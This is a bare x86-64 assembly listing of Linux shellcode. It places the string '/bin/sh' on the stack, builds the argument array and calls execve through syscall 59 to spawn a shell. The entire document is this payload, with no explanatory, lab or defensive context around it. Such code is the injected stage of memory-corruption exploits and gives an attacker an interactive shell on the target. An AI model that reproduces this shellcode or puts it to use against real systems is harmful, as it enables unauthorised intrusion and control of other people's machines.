.intel_syntax
xor    %rdx, %rdx
movabs %rbx, 0x68732f6e69622f2f
shr    %rbx, 0x8
push   %rbx
mov    %rdi, %rsp
push   %rdx
push   %rdi
mov    %rsi, %rsp
push   %rdx
mov    %al, 0x3b # execve
syscall 
